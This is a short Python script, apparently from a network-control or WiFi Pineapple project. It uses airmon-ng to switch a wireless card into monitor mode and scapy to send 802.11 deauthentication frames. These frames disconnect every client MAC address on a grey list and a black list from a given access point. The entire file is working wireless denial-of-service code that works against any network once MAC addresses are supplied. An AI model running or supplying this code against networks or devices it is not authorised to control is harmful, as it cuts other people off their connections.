""" This file has all of the code for deauthenticating the
    devices on the greylist and blacklist
"""
from scapy.all import *
import sys
import globVar
import subprocess

def deauthenticate_devices():
    print("do the deauth thing!")

    result = subprocess.check_output(["airmon-ng", "start", "wlan0"])
    # # The interface that you want to send packets out of, needs to be set to monitor mode
    # # should be global variable
    conf.iface = "wlan0mon"  # This can be found in the Scapy Console via the command IFACES

    # should be global variable
    bssid = globVar.router_bssid  # The BSSID of Wireless Access Point - This is the MAC of my WiFi PineApple
    count = 0
    for address in globVar.greyList:
        client = address.macAddress
        # turn off output
        conf.verb = 0
        packet = scapy.all.RadioTap() / scapy.all.Dot11(addr1=bssid, addr2=client,
                                                            addr3=client) / scapy.all.Dot11Deauth()
        sendp(packet)
    for address in globVar.blackList:
        client = address.macAddress
        # turn off output
        conf.verb = 0
        packet = scapy.all.RadioTap() / scapy.all.Dot11(addr1=bssid, addr2=client,
                                                            addr3=client) / scapy.all.Dot11Deauth()
        sendp(packet)
    result = subprocess.check_output(["airmon-ng", "stop", "wlan0mon"])


























